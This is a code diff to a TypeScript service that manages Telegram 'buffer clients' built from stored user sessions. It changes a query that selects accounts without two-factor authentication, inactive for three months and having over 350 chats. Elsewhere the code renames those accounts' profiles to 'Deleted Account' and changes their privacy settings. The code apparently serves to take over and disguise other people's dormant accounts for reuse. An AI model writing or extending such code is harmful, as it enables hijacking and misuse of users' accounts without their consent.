@@ -193,7 +193,7 @@ export class BufferClientService {
                                 if (error.errorMessage == 'CHANNELS_TOO_MUCH' || errorDetails.error == 'FloodWaitError') {
                                     this.removeFromBufferMap(mobile)
                                     const channels = await this.telegramService.getChannelInfo(mobile, true);
-                                    await this.update(mobile, { channels: channels.ids.length });
+                                    // await this.update(mobile, { channels: channels.ids.length });
                                 }
                             }
                             await this.telegramService.deleteClient(mobile);
@@ -243,17 +243,17 @@ export class BufferClientService {
                 await telegramClient.updatePrivacyforDeletedAccount();
                 await sleep(3000)
                 await telegramClient.updateProfile("Deleted Account", "Deleted Account");
-                await sleep(3000)
-                await telegramClient.deleteProfilePhotos();
-                const channels = await this.telegramService.getChannelInfo(mobile, true)
-                const bufferClient = {
-                    tgId: user.tgId,
-                    session: user.session,
-                    mobile: user.mobile,
-                    availableDate,
-                    channels: channels.ids.length,
-                }
-                await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
+                // await sleep(3000)
+                // await telegramClient.deleteProfilePhotos();
+                // const channels = await this.telegramService.getChannelInfo(mobile, true)
+                // const bufferClient = {
+                //     tgId: user.tgId,
+                //     session: user.session,
+                //     mobile: user.mobile,
+                //     availableDate,
+                //     channels: channels.ids.length,
+                // }
+                // await this.bufferClientModel.findOneAndUpdate({ tgId: user.tgId }, { $set: bufferClient }, { new: true, upsert: true }).exec();
             } catch (error) {
                 const errorDetails = parseError(error)
                 throw new HttpException(errorDetails.message, parseInt(errorDetails.status))
@@ -332,8 +332,8 @@ export class BufferClientService {
     }
 
     async addNewUserstoBufferClients(badIds: string[], goodIds: string[]) {
-        const sixMonthsAgo = (new Date(Date.now() - 6 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
-        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 150 } }, { tgId: 1 }, badIds.length + 3);
+        const sixMonthsAgo = (new Date(Date.now() - 3 * 30 * 24 * 60 * 60 * 1000)).toISOString().split('T')[0];
+        const documents = await this.usersService.executeQuery({ "mobile": { $nin: goodIds }, expired: false, twoFA: false, lastActive: { $lt: sixMonthsAgo }, totalChats: { $gt: 350 } }, { tgId: 1 }, badIds.length + 3);
         console.log("New buffer documents to be added: ", documents.length)
         while (badIds.length > 0 && documents.length > 0) {
             const document = documents.shift();
